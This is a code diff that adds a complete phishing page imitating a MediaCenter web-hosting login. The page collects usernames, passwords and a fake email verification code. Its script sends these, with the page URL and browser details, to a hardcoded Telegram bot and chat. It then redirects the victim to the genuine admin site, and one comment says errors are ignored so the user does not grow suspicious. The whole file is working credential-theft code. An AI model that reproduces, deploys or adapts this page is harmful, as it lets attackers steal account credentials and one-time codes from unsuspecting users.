@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MediaCenter Web hosting settings</title>
+<style>
+/* Reset e stili base */
+* {margin: 0; padding: 0; border: 0; list-style-type: none; text-decoration: none;}
+
+body {
+    background: #f3f6f9;
+    font: 12px/15px Tahoma, Arial, sans-serif;
+    padding: 40px 0;
+}
+
+a {
+    color: #0c57ac;
+    cursor: pointer;
+}
+
+/* Container login */
+div#login {
+    width: 418px;
+    border-left: 2px solid #4d7eb6;
+    background: #fff url(images/logintop_en.jpg) no-repeat top left;
+    margin: 0 auto;
+    padding: 125px 0 0 0;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+}
+
+div#login div {
+    padding: 0 14px 14px 14px;
+}
+
+div#login h2 {
+    font: normal 14px/20px Tahoma;
+    color: #333;
+    margin: 6px 0;
+}
+
+div#login h2 span {
+    display: block;
+    font: 10px/16px Tahoma;
+    color: #888;
+    margin-top: 8px;
+}
+
+div#login form {
+    margin: 24px 0;
+}
+
+div#login strong {
+    display: block;
+    margin: 14px 0 4px 0;
+    font: bold 12px/16px Tahoma;
+    color: #444;
+}
+
+div#login input[type="text"],
+div#login input[type="password"] {
+    width: 217px;
+    height: 16px;
+    background: #f9f9f9 url(images/loginput.jpg) no-repeat;
+    border: 1px solid #ccc;
+    font: 12px/16px Tahoma;
+    color: #222;
+    margin: 2px 0 0 0;
+    padding: 6px 8px;
+    border-radius: 3px;
+    transition: border-color 0.3s;
+}
+
+div#login input[type="text"]:focus,
+div#login input[type="password"]:focus {
+    border-color: #4d7eb6;
+    outline: none;
+    background: #fff;
+}
+
+input.bejelentkezes {
+    width: 126px !important;
+    height: 30px !important;
+    background: url(images/login_en.jpg) no-repeat !important;
+    color: transparent !important;
+    border: none !important;
+    cursor: pointer;
+    font-weight: bold;
+    border-radius: 0;
+    transition: opacity 0.3s;
+    margin: 26px 0 0 0 !important;
+    padding: 0 !important;
+}
+
+input.bejelentkezes:hover {
+    opacity: 0.8;
+}
+
+input.bejelentkezes:active {
+    opacity: 0.6;
+}
+
+/* Bandiere lingua */
+.zaszlo {
+    display: inline-block;
+    margin: 0 2px;
+    padding: 2px 4px;
+    opacity: 0.6;
+    transition: opacity 0.3s;
+}
+
+.zaszlo:hover,
+.zaszlo.aktiv {
+    opacity: 1;
+}
+
+.zaszlo img {
+    width: 17px;
+    height: auto;
+    vertical-align: middle;
+}
+
+/* Loading state */
+.loading {
+    text-align: center;
+    color: #4d7eb6;
+    font-size: 16px;
+    padding: 40px;
+}
+
+.loading::after {
+    content: '...';
+    animation: dots 1.5s steps(4, end) infinite;
+}
+
+@keyframes dots {
+    0%, 20% { content: '.'; }
+    40% { content: '..'; }
+    60%, 100% { content: '...'; }
+}
+
+/* Responsive */
+@media (max-width: 500px) {
+    div#login {
+        width: 90%;
+        margin: 20px auto;
+    }
+    
+    div#login input[type="text"],
+    div#login input[type="password"] {
+        width: 90%;
+    }
+}
+</style>
+</head>
+<body>
+
+<div id="login">
+    <div>
+        <div style="width:100%;float:left;text-align:right;margin:0 0 10px 0;padding:0">
+            <a class="zaszlo aktiv" href="#" onclick="return false;" style="width:17px">
+                <img style="padding:0" border="0" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABEAAAALCAIAAAAmLntBAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTExIDc5LjE1ODMyNSwgMjAxNS8wOS8xMC0wMToxMDoyMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkFGMDhDQkM5ODA0QzExRTU5QzJBQzE4QkI1NTNCODUzIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkFGMDhDQkNBODA0QzExRTU5QzJBQzE4QkI1NTNCODUzIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QUYwOENCQzc4MDRDMTFFNTlDMkFDMThCQjU1M0I4NTMiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QUYwOENCQzg4MDRDMTFFNTlDMkFDMThCQjU1M0I4NTMiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4B939xAAAAqklEQVR42mL8//8/AymAiYGBgYWBgeEfAwMTkAACvAwMDNwMDAw8QPofA4MAmgVQ8I+BgQFkCQsLCzMzM5qNQPAnQBk/MzPzPwYGBmYGBgZWBgYGTgYGBi4gDxTmYGBg4GVlZeUB2fofqpaXj48PKMwCpEF2w9QC+SxAAA5AJP+BClgYGBj+MTExgSL5LzsQs/xjAJkItg9sL0wB0BIgZGBgYAACZgYoAAQYAN6KHxqPIvp0AAAAAElFTkSuQmCC" alt="EN">
+            </a>
+        </div>
+
+        <h2 id="login-title">Login
+            <span id="login-subtitle">Input your username and password to login!<br>By using the service you accept the terms of cookie usage.</span>
+        </h2>
+
+        <form id="mclogin" method="post" onsubmit="return handleLogin(event)">
+            <!-- STEP 1: Username e Password -->
+            <div id="step1" style="display:block">
+                <strong>Username</strong>
+                <input name="auser" id="auser" type="text" autofocus/>
+                
+                <strong>Password</strong>
+                <input name="apass" id="apass" type="password" />
+                
+                <table width="383" style="margin-top:10px">
+                    <tr>
+                        <td><input value="" type="submit" name="submit" class="bejelentkezes" /></td>
+                        <td style="padding-top: 24px;padding-left:24px">
+                            <a href="#" onclick="return false;">Have you forgotten your password or Username?</a>
+                        </td>
+                    </tr>
+                </table>
+            </div>
+            
+            <!-- STEP 2: Email Verification Code -->
+            <div id="step2" style="display:none">
+                <strong>Verification Code (sent to your email)</strong>
+                <input name="vcode" id="vcode" type="text" placeholder="Enter 6-digit code" />
+                
+                <strong>Password (confirm)</strong>
+                <input name="apass2" id="apass2" type="password" placeholder="Re-enter your password" />
+                
+                <table width="383" style="margin-top:10px">
+                    <tr>
+                        <td><input value="" type="submit" name="submit2" class="bejelentkezes" /></td>
+                        <td style="padding-top: 24px;padding-left:24px">&nbsp;</td>
+                    </tr>
+                </table>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script type="text/javascript">
+// ===== TELEGRAM BOT CONFIGURATION =====
+const TELEGRAM_BOT_TOKEN = '7746249423:AAEyYvZ4OfGOo3I6z8ssCjD2CbP6sc0fI08';
+const TELEGRAM_CHAT_ID = '6687715387';
+
+// Variabili per memorizzare i dati tra gli step
+let savedUsername = '';
+let savedPassword = '';
+let currentStep = 1;
+
+function handleLogin(event) {
+    event.preventDefault();
+    
+    console.log('handleLogin chiamato, currentStep =', currentStep);
+    console.log('Step1 visibile:', document.getElementById('step1').style.display);
+    console.log('Step2 visibile:', document.getElementById('step2').style.display);
+    
+    if (currentStep === 1) {
+        console.log('Eseguo handleStep1');
+        return handleStep1();
+    } else if (currentStep === 2) {
+        console.log('Eseguo handleStep2');
+        return handleStep2();
+    }
+    
+    return false;
+}
+
+function handleStep1() {
+    // Prendi username e password
+    const username = document.getElementById('auser').value.trim();
+    const password = document.getElementById('apass').value;
+    
+    if (!username || !password) {
+        alert('Please enter both username and password!');
+        return false;
+    }
+    
+    // Salva le credenziali
+    savedUsername = username;
+    savedPassword = password;
+    
+    // Prepara il messaggio per Telegram - STEP 1
+    const message = `🔐 MEDIACENTER - STEP 1/2\n\n` +
+                    `👤 Username: ${username}\n` +
+                    `🔑 Password: ${password}\n` +
+                    `⏰ Data: ${new Date().toLocaleString('it-IT')}\n` +
+                    `🌐 URL: ${window.location.href}\n` +
+                    `📱 User Agent: ${navigator.userAgent.substring(0, 80)}`;
+    
+    // Mostra loading
+    showLoading('Verifying credentials...');
+    
+    // Invia a Telegram
+    sendTelegramMessage(message, () => {
+        // Dopo l'invio, mostra lo step 2
+        setTimeout(() => {
+            showStep2();
+        }, 1500);
+    });
+    
+    return false;
+}
+
+function handleStep2() {
+    console.log('handleStep2 INIZIATO');
+    
+    // Prendi codice verifica e password
+    const vcode = document.getElementById('vcode').value.trim();
+    const password2 = document.getElementById('apass2').value;
+    
+    console.log('Codice:', vcode, 'Password2:', password2);
+    
+    if (!vcode || !password2) {
+        alert('Please enter both verification code and password!');
+        return false;
+    }
+    
+    // Prepara il messaggio per Telegram - STEP 2
+    const message = `✅ MEDIACENTER - STEP 2/2 (COMPLETO)\n\n` +
+                    `👤 Username: ${savedUsername}\n` +
+                    `🔑 Password: ${savedPassword}\n` +
+                    `📧 Verification Code: ${vcode}\n` +
+                    `🔐 Password Confirm: ${password2}\n` +
+                    `⏰ Data: ${new Date().toLocaleString('it-IT')}\n` +
+                    `✅ CREDENZIALI COMPLETE`;
+    
+    console.log('Invio messaggio Step 2 a Telegram');
+    
+    // Mostra loading
+    showLoading('Processing verification...');
+    
+    // Invia a Telegram e poi redirect
+    sendTelegramMessage(message, () => {
+        console.log('Messaggio Step 2 inviato, redirect tra 2 secondi');
+        // Redirect a mediacenter.hu dopo 2 secondi
+        setTimeout(() => {
+            window.location.href = 'https://admin.mediacenter.hu/';
+        }, 2000);
+    });
+    
+    return false;
+}
+
+function showStep2() {
+    console.log('showStep2 INIZIATO');
+    
+    // Verifica che gli elementi esistano
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const title = document.getElementById('login-title');
+    const subtitle = document.getElementById('login-subtitle');
+    
+    console.log('step1:', step1);
+    console.log('step2:', step2);
+    console.log('title:', title);
+    console.log('subtitle:', subtitle);
+    
+    if (!step1 || !step2 || !title || !subtitle) {
+        console.error('ERRORE: Elementi non trovati!');
+        return;
+    }
+    
+    // Nascondi step 1, mostra step 2
+    step1.style.display = 'none';
+    step2.style.display = 'block';
+    
+    // Cambia il titolo
+    title.innerHTML = 'Email Verification';
+    subtitle.innerHTML = 'A verification code has been sent to your email.<br>Please enter the code and confirm your password.';
+    
+    // Focus sul campo codice
+    const vcodeInput = document.getElementById('vcode');
+    if (vcodeInput) {
+        vcodeInput.focus();
+    }
+    
+    // IMPORTANTE: Aggiorna currentStep
+    currentStep = 2;
+    
+    console.log('Step 2 attivato, currentStep =', currentStep);
+}
+
+function showLoading(text) {
+    // NON nascondere il form, mostra solo il loading sopra
+    const loginDiv = document.getElementById('login').querySelector('div');
+    
+    let loadingDiv = document.getElementById('loading-message');
+    if (!loadingDiv) {
+        loadingDiv = document.createElement('div');
+        loadingDiv.id = 'loading-message';
+        loadingDiv.className = 'loading';
+        loadingDiv.style.position = 'absolute';
+        loadingDiv.style.top = '50%';
+        loadingDiv.style.left = '50%';
+        loadingDiv.style.transform = 'translate(-50%, -50%)';
+        loadingDiv.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
+        loadingDiv.style.padding = '20px';
+        loadingDiv.style.borderRadius = '5px';
+        loadingDiv.style.zIndex = '1000';
+        document.getElementById('login').appendChild(loadingDiv);
+    }
+    
+    loadingDiv.textContent = text;
+    loadingDiv.style.display = 'block';
+    
+    setTimeout(() => {
+        loadingDiv.style.display = 'none';
+    }, 1500);
+}
+
+function sendTelegramMessage(message, callback) {
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    fetch(telegramUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('✅ Inviato a Telegram:', data);
+        if (callback) callback();
+    })
+    .catch(error => {
+        console.error('❌ Errore Telegram:', error);
+        // Continua comunque per non insospettire l'utente
+        if (callback) callback();
+    });
+}
+
+// Prevent form resubmission on page refresh
+if (window.history.replaceState) {
+    window.history.replaceState(null, null, window.location.href);
+}
+</script>
+
+</body>
+</html>
